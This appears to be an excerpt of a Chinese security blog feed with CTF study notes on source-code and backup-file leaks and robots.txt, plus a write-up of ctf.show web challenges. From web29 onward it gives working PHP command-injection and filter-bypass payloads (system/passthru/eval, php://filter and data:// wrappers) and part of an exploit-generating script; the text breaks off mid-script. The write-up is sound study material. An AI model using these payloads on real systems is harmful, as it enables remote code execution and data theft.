网站管理员在发布代码时，没有使用‘导出’功能，而是直接复制代码文件夹到WEB服务器上，这就使.svn隐藏文件夹被暴露于外网环境，可以利用.svn&#x2F;entries文件，获取到服务器源码。</p></blockquote><blockquote><p>修复建议:删除web目录中所有.svn隐藏文件夹，开发人员在使用SVN时，严格使用导出功能，禁止直接复制代码</p></blockquote><h2 id="hg-源码泄露"><a href="#hg-源码泄露" class="headerlink" title=".hg 源码泄露"></a>.hg 源码泄露</h2><p>Mercurial是一种分布式版本控制系统，用于管理和跟踪项目中的源代码和文件</p><blockquote><p>使用 <code>hg init</code>的时候会生成.hg</p></blockquote><p><a href="https://cn-sec.com/archives/1245013.html">常见源码泄露</a></p><p><a href="https://lddp.github.io/2018/05/10/WEB-%E6%BA%90%E7%A0%81%E6%B3%84%E6%BC%8F/">WEB安全-常见源码泄露</a></p>]]></content>
      
      
      <categories>
          
          <category> 基础认识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>文件泄露</title>
      <link href="/2023/06/01/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/"/>
      <url>/2023/06/01/%E6%96%87%E4%BB%B6%E6%B3%84%E9%9C%B2/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原理：</p><ul><li>服务器管理员错误地将网站或者网页的备份文件放置到服务器web目录下。</li><li>编辑器在使用过程中自动保存的备份文件或者临时文件因为各种原因没有被删除而保存在web目录下</li></ul></blockquote><h2 id="PHP文件泄露"><a href="#PHP文件泄露" class="headerlink" title="PHP文件泄露"></a>PHP文件泄露</h2><p><strong>phps即为 PHP Source</strong>(.phps后缀)</p><blockquote><p>phps文件就是php的源码文件,用于给用户查看php代码.服务器不会执行他们,并将他们以文本文件发送给浏览器,在PHP5.4.0版本后将.phps文件从默认PHP配置中移除</p></blockquote><p>一般出现的场景: 源代码共享、教学或演示目的</p>]]></content>
      
      
      <categories>
          
          <category> 基础认识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>了解robots协议</title>
      <link href="/2023/05/30/robots%E5%8D%8F%E8%AE%AE/"/>
      <url>/2023/05/30/robots%E5%8D%8F%E8%AE%AE/</url>
      
        <content type="html"><![CDATA[<h1 id="robots协议"><a href="#robots协议" class="headerlink" title="robots协议"></a>robots协议</h1><blockquote><p>robots.txt是用于通知爬虫的，内容包含了不希望被爬的信息</p><p>如:</p><p>1.不要访问某个文件、文件夹</p><p>2.禁止某些爬虫的访问</p><p>3.限制爬虫访问网站的频率</p></blockquote><h1 id="如何查看robots-txt"><a href="#如何查看robots-txt" class="headerlink" title="如何查看robots.txt"></a>如何查看robots.txt</h1><blockquote><p>网址&#x2F;robots.txt</p><p>如:cn.bing.com&#x2F;robots.txt</p></blockquote><h1 id="参数"><a href="#参数" class="headerlink" title="参数:"></a>参数:</h1><blockquote><p>1.User-agent: 爬虫的名称（User-agent是*，则表示对象是所有爬虫。）</p><p>2.Disallow: 不允许爬虫访问的地址（Disallow: &#x2F;表示所有文件不可以爬）</p><p>3.Allow: 允许爬虫访问的地址</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 基础认识 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web入门</title>
      <link href="/2023/05/30/ctf.show-web%E5%85%A5%E9%97%A8/"/>
      <url>/2023/05/30/ctf.show-web%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><h3 id="web1-3"><a href="#web1-3" class="headerlink" title="web1-3"></a>web1-3</h3><blockquote><p>web1：</p><p>1.直接查看源码即可</p></blockquote><blockquote><p>web2：</p><p>1.可以使用Ctrl+U查看源码</p><p>2.火狐浏览器的网址栏输入about:config，再输入javascript关闭它即可</p></blockquote><blockquote><p>web3：</p><p>1.发现源码没有信息，查看响应包，F2然后查看network</p></blockquote><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Status">了解响应包</a></p><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p>考点：robots协议</p><p><a href="https://ntrack.github.io/2023/05/30/robots%E5%8D%8F%E8%AE%AE/">简单了解robots协议</a></p><blockquote><p>输入：网址&#x2F;robots.txt</p></blockquote><p>获取到信息，存在不想被爬的flagishere.txt文件</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202305302304248.png"></p><blockquote><p>再输入：网址&#x2F;flagishere.txt</p><p>获取到flag</p></blockquote><p>web5-6</p><p>考点：phps文件泄露、www源码泄露</p><p>积累个字典，使用dirb去爆破目录</p><blockquote><p>dirb 网址 自定义字典</p></blockquote><h3 id="web7-9"><a href="#web7-9" class="headerlink" title="web7-9"></a>web7-9</h3><p>考点：git源码泄露、svn源码泄露</p><blockquote><p>查看是否存在.git、.svn文件后缀:网址&#x2F;.git网址&#x2F;.svn</p></blockquote><h3 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h3><p>考点：vim缓存信息泄露</p><blockquote><p>再积累个字典信息，使用dirb进行爆破</p></blockquote><h3 id="web11"><a href="#web11" class="headerlink" title="web11"></a>web11</h3><p>考点：cookie传递信息</p><blockquote><p>通过网页调试的network进行查看cookie，发现存在flag信息</p></blockquote><p><a href="https://ntrack.github.io/2023/05/28/Cookie/">了解cookie</a></p><h3 id="web12"><a href="#web12" class="headerlink" title="web12"></a>web12</h3><p>考点：利用所有信息</p><blockquote><p>查看源码后没有发现，看了network的信息没有帮助，然后扫一波目录，发现了admin目录，进去发现需要密码，找了一圈就发现原来页面下面的数字有用，输入admin和数字，成功获得</p></blockquote><h3 id="web14"><a href="#web14" class="headerlink" title="web14"></a>web14</h3><p>考点：编辑器默认配置泄露网站根目录</p><blockquote><p>查看源码和其他信息，发现很多内容都是无用的，太多信息也没有看过来，根据提示找到了图1信息。进入以下目录editor&#x2F;upload&#x2F;发现是404信息，退一个目录进入editor发现是编辑器，点击一圈，发现存在插入文件有文件空间(即编辑器默认配置显示目录空间)，点击看到一堆的目录，事先看var目录下的信息，中奖发现www目录，进入html目录，发现一个nothinghere的目录，进入发现fl000g.txt文件，然后在目录栏中输入:网址&#x2F;nothinghere&#x2F;fl000g.txt看到flag。(发现editor目录也可以用dirb进行扫描，丰富了一波字典)</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202306022320167.png"></p><p><a href="https://blog.csdn.net/angry_program/article/details/107855078">目录穿越&#x2F;遍历漏洞 – 学习笔记</a></p><h3 id="web15"><a href="#web15" class="headerlink" title="web15"></a>web15</h3><p>考点：利用公开信息</p><blockquote><p>看了一波源码，并没有什么发现，只有一些英文和图片，然后没有发现有用信息，使用dirb扫描一波目录，发现了admin目录和admin&#x2F;index.php文件，点开admin.php发现是一个登录界面，然后尝试抓包跑了一波sqlmap，发现没有用，再回去点击忘记密码，发现需要密保(居住城市)，再返回查看首页，发现只有邮箱，然后查看QQ信息，发现是西安的，重置密码成功，再次登录成功获得flag。（有点假，就是收获个思想）</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202306030008734.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202306030009943.png"></p><p><a href="https://www.toolfk.com/tools/online-qq.html">QQ信息方便查找网站</a></p><h3 id="web16"><a href="#web16" class="headerlink" title="web16"></a>web16</h3><p>考点：PHP探针</p><p>php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息</p><blockquote><p>查看源码发现都是css，js文件，没有用处，然后查看数据包发现也没有需要的信息，通过dirb扫描一波无用后，看了题解添加tz.php文件查看php探针。发现存在很多信息，根据提示查看phpinfo配置，发现其中有flag</p></blockquote><p><a href="https://www.cnblogs.com/Cl0ud/p/15999347.html">了解一下phpinfo信息利用</a></p><h3 id="web17"><a href="#web17" class="headerlink" title="web17"></a>web17</h3><p>考点：sql备份泄露</p><blockquote><p>查看源码发现没有什么信息，只有拼成的简陋图1，查看数据包也没有。使用dirb发现了backup.sql文件(图2)，下载发现flag</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202306031920954.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202306031922765.png" alt="图2"></p><h3 id="web18"><a href="#web18" class="headerlink" title="web18"></a>web18</h3><p>考点：审查js代码</p><blockquote><p>查看了源码，发现只有js和css文件，然后查看数据包，没有需要信息，再用dirb扫一波，发现只有没用的loin.php，最后没有办法查看提示，发现是新接触的题型，对js进行审计，发现了game_over一开始为false，然后socre&gt;100的时候输出一些编码信息(图1)，然后直接对该信息进行unicode解码，发现是图2信息，然后根据提示看到flag，一开始题目也给了101分钟也是一种提示。</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202306032213677.png"></p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202306032214501.png" alt="图2"></p><p><a href="https://www.toolhelper.cn/EncodeDecode/UnicodeChineseEncodeDecode">解码工具</a></p><h3 id="web19"><a href="#web19" class="headerlink" title="web19"></a>web19</h3><p>考点：泄露重要信息在前端</p><blockquote><p>查看源码发现了重要信息(图1)，知道设置了username和pazzword并且这些值等于图上的值的时候echo flag，而且上面有对pazzword进行加密，所以直接用hackbar进行传输username和pazzword的明文，获取到flag</p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202306032241325.png"></p><blockquote><p>直接传递POST会将文明直接发送给服务器，但是这可能被拦截，所以会在前端进行一定的数据加密</p></blockquote><h2 id="信息收集总结一波"><a href="#信息收集总结一波" class="headerlink" title="信息收集总结一波"></a>信息收集总结一波</h2><p><strong>需要收集可利用信息，如果无法找到可见的有用信息再对网站进行目录爆破，需要好好做好爆破字典收集</strong></p><h2 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h2><h3 id="web25"><a href="#web25" class="headerlink" title="web25"></a>web25</h3><p>有点巧妙，找到了个工具php生成种子工具</p><p>一看就是PHP代码审计，然后发现了$rand&#x3D;intval($r)-intval(mt_rand())并且打印了$rand,这不就是一大块可以知道mt_rand()的值嘛，然后求出这个值就可以了，很遗憾自己没有实力求出它的种子，下面上工具求出值后即可获取flag</p><blockquote><p>工具地址：<a href="https://github.com/Al1ex/php_mt_seed">https://github.com/Al1ex/php_mt_seed</a></p><p>git下载方式：git clone <a href="https://github.com/Al1ex/php_mt_seed">https://github.com/Al1ex/php_mt_seed</a><br>下载后命令行输入make然后回车编译出php_mt_seed文件</p><p>当前目录使用：.&#x2F;php_mt_seed  随机值</p></blockquote><h2 id="爆破总结一波"><a href="#爆破总结一波" class="headerlink" title="爆破总结一波"></a>爆破总结一波</h2><p><strong>很多时候都会用到工具，要熟悉工具, 还需要收集一些字典</strong></p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>考点：过滤条件下使用命令</p><h3 id="web29"><a href="#web29" class="headerlink" title="web29"></a>web29</h3><p>查看源码发现通过get方式传入c并且大小写传入过滤flag(&#x2F;i是不区分大小写)，然后传入&#x2F;?c&#x3D;system(“ls”);发现了当前目录下存在flag.php，然后就看wp了</p><blockquote><p>解法一：使用system函数+？、*</p><p>&#x2F;?c&#x3D;system(‘tac *g.php’);&#x2F;&#x2F;*代表多个匹配</p><p>&#x2F;?c&#x3D;system(‘tac ?lag.php’);&#x2F;&#x2F;?代表一个匹配</p></blockquote><blockquote><p>解法二：引用参数+eval</p><p>&#x2F;?c&#x3D;eval($GET[1]);&amp;1&#x3D;system(“tac flag.php”);&#x2F;&#x2F;&amp;1表示system(“tac flag.php”)，前面的eval($GET[1])相当于eval(system(“tac flag.php”);),直接执行了系统命令，不用通过源码的验证是否存在flag</p></blockquote><blockquote><p>解法三：闭合语句+文件包含+伪协议</p><p>&#x2F;?c&#x3D;1;?&gt;&lt;?php include($_GET[‘url’]);&amp;url&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>然后base64解码</p></blockquote><blockquote><p><strong>解法四：复制文件+系统命</strong>令(我觉得很骚)<br>?c&#x3D;system(“cp ?lag.php 1.txt”);&#x2F;&#x2F;需要调用系统执行函数</p><p>然后查看1.txt文件</p></blockquote><p>注意：</p><p>1.如果system函数被禁用可以使用passthru代替</p><p>2.php的eval执行是语句，所以需要用;来闭合语句，不然报错</p><p><a href="https://www.php.cn/faq/354831.html">PHP正则表达式认识</a></p><h3 id="web30"><a href="#web30" class="headerlink" title="web30"></a>web30</h3><p>考点：过滤条件下使用命令</p><p>通过显示的源码发现禁用了flag&#x2F;system&#x2F;php，这时候发现就会少了很多可用的技能，如php伪协议、system函数等等，然后根据上一题的学到了passthru这个函数可用替代system函数，而exec这个函数执行不会返回结果，所以无法达到想要的目的。</p><blockquote><p>解法一：passthru函数+tac</p><p>?c&#x3D;passthru(“tac%20?lag.?hp”);</p></blockquote><blockquote><p>解法二：passthru函数+cp</p><p>?c&#x3D;passthru(“cp%20?lag.?hp 1.txt”);</p><p>然后查看1.txt</p></blockquote><blockquote><p>解法三：echo +反字节(和调用系统函数接近)</p><p>?c&#x3D;echo `ls`;</p><p>?&#x3D;echo `cp%20?lag.?hp%201.txt`;</p></blockquote><h3 id="web31"><a href="#web31" class="headerlink" title="web31"></a>web31</h3><p>考点：过滤条件下使用命令</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202308241747912.png"></p><p>发现该题目过滤的条件有点多,其中sort是常用于文件内容排序,无法使用system执行命令,那么可以使用passthru,后来使用passthru(“echo%09$0”);发现shell是sh,即无法使用{$IFS}绕过空格,其中%09的url解析为tab的作用.</p><blockquote><p>解法一: passthru函数+tac+正则表达式</p><p>?c&#x3D;passthru(“tac%09fla*”);</p></blockquote><blockquote><p>解法二: passthru函数+cp+文件复制+正则表达式</p><p>?c&#x3D;passthru(“cp%09fla*%091”);</p><p>?c&#x3D;passthru(“tac%091”);</p><p>解法三: passhtru函数+eval嵌套</p><p>?c&#x3D;eval($_GET[b]);&amp;b&#x3D;passthru(“tac%09fla*”);</p><blockquote><p>理解:传入两个参数,其中参数c是eval($_GET[b]),即过滤只对这个参数c进行过滤,不影响后面的参数b,而参数b是作为c的$_GET的执行参数,c参数执行为eval(“passthru(“tac%09fla*”);”)</p></blockquote></blockquote><h3 id="web32"><a href="#web32" class="headerlink" title="web32"></a>web32</h3><p>考点：严格过滤条件下使用命令</p><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202308251944163.png"></p><p>发现过滤了很多的内容，其中将反引号和(过滤了，即无法使用带有括号的函数，也无法使用部分php伪协议，还无法使用;闭合内容。尝试使用编码绕过，发现技术不到位，困难看wp</p><blockquote><p>解法一：使用include和filter伪协议</p><p>?c&#x3D;include%09$_GET[“rs”]?&gt;&amp;rs&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p><p>解释：</p><p>1.include函数无需要括号也可以执行，不过需要空格开</p><p>2.使用%09代替空格，%09是tab的url编码</p><p>3.使用?&gt;闭合函数，达到绕过分号的作用</p><p>4.使用引用参数来实现伪协议的使用（直接包含flag.php会发现没有输出）</p></blockquote><blockquote><p>解法二：include和data:&#x2F;&#x2F;伪协议</p><p>?c&#x3D;include$_GET[rs]?&gt;&amp;rs&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(“ls”);&#x2F;&#x2F;查看当前目录的文件</p><p>?c&#x3D;include$_GET[rs]?&gt;&amp;rs&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,&lt;?php system(“tac flag*”);</p></blockquote><h3 id="web33"><a href="#web33" class="headerlink" title="web33"></a>web33</h3><p>内容大概如上，不过需要注意过滤多了一个双引号，所以$_GET括号中的“不用使用</p><blockquote><p>?c&#x3D;include%0a$_GET[rs]?&gt;&amp;rs&#x3D;php:&#x2F;&#x2F;filter&#x2F;read&#x3D;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><h3 id="web34"><a href="#web34" class="headerlink" title="web34"></a>web34</h3><p>内容大概如上，过滤多了一个冒号，不过使用引用参数，正则匹配并不影响第二个rs参数，可以使用伪协议</p><blockquote><p>?c&#x3D;include$_GET[rs]?&gt;&amp;rs&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php</p></blockquote><h3 id="web37"><a href="#web37" class="headerlink" title="web37"></a>web37</h3><p>自<code>PHP&gt;=5.2.0</code>起，&gt;可以使用<code>data://</code>数据流封装器，以传递相应格式的数据。<strong>通常可以用来执行PHP代码</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php">用法<span class="token punctuation">:</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain,</span>data<span class="token punctuation">:</span><span class="token comment">//text/plain;base64,</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202308291003973.png"></p><p>对传入的参数c进行了过滤，传入包含大小写为flag的参数内容则无效。需要输入文件名字，然后获取flag.php的flag值，需要转码或者正则表达式来达到绕过flag过滤</p><blockquote><p>解码：data:&#x2F;&#x2F; + base64编码 &#x2F; 正则表达式</p><p>查看目录： ?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJscyIpOyA&#x2F;Pg&#x3D;&#x3D;</p><p>获取flag.php信息：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain;base64,PD9waHAgc3lzdGVtKCJ0YWMgZmxhZy5waHAiKTsgPz4&#x3D;</p><p>获取flag.php信息：?c&#x3D;data:&#x2F;&#x2F;text&#x2F;plain,<?php system("cat fla?.php");?></p></blockquote><h3 id="web40"><a href="#web40" class="headerlink" title="web40"></a>web40</h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202308301111790.png"></p><p>过滤了很多的内容，包括$和&amp;，则无法使用include函数和调用参数，无法使用冒号则排除了使用伪协议的可能，无法使用反引号则无法使用linux的命令。发现括号是中文括号，并不是应该括号，所以可以使用一些函数，这题最后做不出来，只能看wp了。</p><blockquote><p>解法一：get_defined_vars()  + array_pop()  + next() </p><p>?c&#x3D;eval(array_pop(next(get_defined_vars()))); + 查看目录post: rs&#x3D;system(“ls”);  | 获取内容post: rs &#x3D; system(“tac flag*”);</p><blockquote><p>解法解释：</p><p>get_defined_vars () : 返回一个包含所有已定义变量列表的多维数组，这些变量包括环境变量、服务器变量和用户定义的变量(版本PHP 4 &gt;&#x3D; 4.0.4, PHP 5, PHP 7)</p><blockquote></blockquote><p>array_pop() ：删除数组中的最后一个元素并返回<em>数组</em>的最后一个值</p><blockquote></blockquote><p>current() : 返回数组中的当前(第一个)元素的值</p><blockquote></blockquote><p>next() : 将内部指针指向数组当前元素的下一个元素，并输出</p></blockquote><blockquote><p>总说法：</p><blockquote></blockquote><p>先使用?c&#x3D;print_r(get_defined_vars());获取变量信息，发现了顺序为GET、POST、_COOKIE和_FILES_信息，其GET和_FILES_数组信息为输入信息，POST和_COOKIE信息为空。用hackbar对POST进行操作，发现可行(还不会对COOKIE进行操作)。思路：先用next取出get_defined_vars的post的内容，然后取出post内容的第一个元素作为执行的命令内容。取出post内容的payload为next(get_defined_vars())，取出post值的第一个元素的payload为current(next(get_defined_vars()))或者array_pop(next(get_defined_vars()))，因为post只有一个元素。最后执行该内容即可，即?c&#x3D;eval(array_pop(next(get_defined_vars())));  + post传值</p></blockquote></blockquote><p><a href="https://www.runoob.com/php/func-array-pos.html">PHP操作函数</a></p><blockquote><p>解法二：localeconv() + reset() + scandir() + array_reverse() + next() + show_source()</p><p>?c&#x3D;show_source(next(array_reverse(scandir(reset(localeconv())))));</p><blockquote><p>解法解释：</p><p>localeconv() : 函数返回一个包含本地数字及货币格式信息的数组, 第一个元素是”  . “</p><p>scandir() : 返回指定目录中的文件和目录的数组</p><p>array_reverse() : 将原数组中的元素顺序翻转，创建新的数组并返回</p><p>reset() : 将内部指针指向数组中的第一个元素，并输出</p><p>show_source()  : 是highlight_file()的别名，对文件进行 PHP 语法高亮显示，即显示源码。 </p></blockquote><blockquote><p>总说法：</p><p>取出localeconv的第一个元素” . “作为scandir的参数，即返回当前目录的文件和目录信息，然后发现flag.php在倒数第二个，逆序数组，flag.php就成为新 数组的第二位置，用next()函数可以获取第二个位置的内容，然后用show_source打印flag.php的源码，即获取到flag</p></blockquote></blockquote><p><a href="https://www.runoob.com/php/func-string-localeconv.html">localeconv()</a></p><h3 id="web41"><a href="#web41" class="headerlink" title="web41"></a><strong>web41</strong></h3><p><img src="https://cdn.jsdelivr.net/gh/ntrack/blog_img/img/202308302107618.png"></p><p>这题过滤了很多的内容，想尝试异或或者取反绕过，发现也过滤了相关的~和^，直接看wp，运用了一个很好的脚本来执行了命令</p><blockquote><p><a href="https://blog.csdn.net/miuzzx/article/details/108569080">web41题解和脚本</a></p><p>生成可用字符脚本rec.php：</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token operator">></span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"rce_or.txt"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token string double-quoted-string">""</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">256</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$j</span> <span class="token operator">&lt;</span><span class="token number">256</span> <span class="token punctuation">;</span> <span class="token variable">$j</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_i</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token operator">&lt;</span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token string single-quoted-string">'0'</span><span class="token operator">.</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$hex_j</span><span class="token operator">=</span><span class="token function">dechex</span><span class="token punctuation">(</span><span class="token variable">$j</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$preg</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'/[0-9]|[a-z]|\^|\+|\~|\$|\[|\]|\&#123;|\&#125;|\&amp;|\-/i'</span><span class="token punctuation">;</span><span class="token comment">//可用修改过滤的内容</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_i</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">preg_match</span><span class="token punctuation">(</span><span class="token variable">$preg</span> <span class="token punctuation">,</span> <span class="token function">hex2bin</span><span class="token punctuation">(</span><span class="token variable">$hex_j</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span> <span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_i</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token string single-quoted-string">'%'</span><span class="token operator">.</span><span class="token variable">$hex_j</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">|</span><span class="token class-name">urldecode</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">>=</span><span class="token number">32</span><span class="token operator">&amp;</span><span class="token function">ord</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span><span class="token operator">&lt;=</span><span class="token number">126</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$contents</span><span class="token operator">=</span><span class="token variable">$contents</span><span class="token operator">.</span><span class="token variable">$c</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token string double-quoted-string">" "</span><span class="token operator">.</span><span class="token variable">$b</span><span class="token operator">.</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token punctuation">&#125;</span><span class="token operator">></span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span><span class="token variable">$contents</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token operator">></span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>调用生成内容执行命令脚本exp.py：(python exp.py url)</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token operator">></span><span class="token comment"># -*- coding: utf-8 -*-</span><span class="token operator">></span><span class="token keyword">import</span> requests<span class="token operator">></span><span class="token keyword">import</span> urllib<span class="token operator">></span><span class="token keyword">from</span> sys <span class="token keyword">import</span> <span class="token operator">*</span><span class="token operator">></span><span class="token keyword">import</span> os<span class="token operator">></span>os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string">"php rce_or.php"</span><span class="token punctuation">)</span>  <span class="token comment">#没有将php写入环境变量需手动运行</span><span class="token operator">></span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>argv<span class="token punctuation">)</span><span class="token operator">!=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'USER：python exp.py &lt;url>'</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"eg：  python exp.py http://ctf.show/"</span><span class="token punctuation">)</span>     <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"="</span><span class="token operator">*</span><span class="token number">50</span><span class="token punctuation">)</span>     exit<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">></span>url<span class="token operator">=</span>argv<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">></span><span class="token keyword">def</span> action<span class="token punctuation">(</span>arg<span class="token punctuation">)</span><span class="token punctuation">:</span>     s1<span class="token operator">=</span><span class="token string">""</span>     s2<span class="token operator">=</span><span class="token string">""</span>     <span class="token keyword">for</span> i <span class="token keyword">in</span> arg<span class="token punctuation">:</span>           f<span class="token operator">=</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">"rce_or.txt"</span><span class="token punctuation">,</span><span class="token string">"r"</span><span class="token punctuation">)</span>           <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span>               t<span class="token operator">=</span>f<span class="token punctuation">.</span>readline<span class="token punctuation">(</span><span class="token punctuation">)</span>               <span class="token 